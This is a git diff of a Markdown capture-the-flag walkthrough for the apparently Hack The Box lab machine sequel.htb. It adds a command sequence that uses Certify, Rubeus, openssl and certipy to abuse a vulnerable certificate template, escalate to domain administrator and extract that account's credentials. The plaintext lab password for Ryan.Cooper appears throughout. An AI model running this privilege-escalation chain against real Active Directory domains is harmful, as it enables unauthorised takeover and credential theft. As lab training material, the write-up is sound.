@@ -1,4 +1,4 @@
-```
+![image](https://github.com/user-attachments/assets/5d7c4776-2792-46dd-890f-24b8d6285e52)![image](https://github.com/user-attachments/assets/9804f07e-0912-450d-a261-07bd7f5f7ac7)![image](https://github.com/user-attachments/assets/6becdeb8-287d-4aa9-82f4-950b24332ba8)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.202
 dc.sequel.htb
 ```
@@ -66,3 +66,49 @@ crackmapexec winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
 evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
 ```
 ![image](https://github.com/user-attachments/assets/95b9055c-951e-4a11-855b-ee410f182df7)
+
+```
+Download Certify.exe https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any
+upload Certify.exe
+.\Certify.exe find /vulnerable /currentuser
+```
+![image](https://github.com/user-attachments/assets/291c9e18-5898-42e1-af69-1827741ff159)
+
+```
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+```
+![image](https://github.com/user-attachments/assets/2a436b62-2ab5-48d8-94f7-4b6af84b6493)
+
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter no password
+```
+![image](https://github.com/user-attachments/assets/0bde621d-fe4b-493d-9f38-3ece278b7e9b)
+
+```
+upload cert.pfx
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+```
+![image](https://github.com/user-attachments/assets/6a4ab877-c5ea-4fef-9ce5-4da8f5eee66a)
+
+```
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
+```
+![image](https://github.com/user-attachments/assets/39fbe789-1258-426c-ae50-07de66d154c6)
+
+```
+git clone https://github.com/ly4k/Certipy.git
+python3 setup.py install
+Certipy
+```
+![image](https://github.com/user-attachments/assets/1bf7e649-bcca-4ca8-9648-5670bfe5b0ed)
+
+```
+.\Certify.exe find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
+```
+![image](https://github.com/user-attachments/assets/56d22ec3-ab2b-47c9-9ec8-35ea0f2a4c5c)
+
+```
+certipy req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
+```
+![image](https://github.com/user-attachments/assets/9b2a463d-f72f-4a5e-89a2-e829faef9f46)
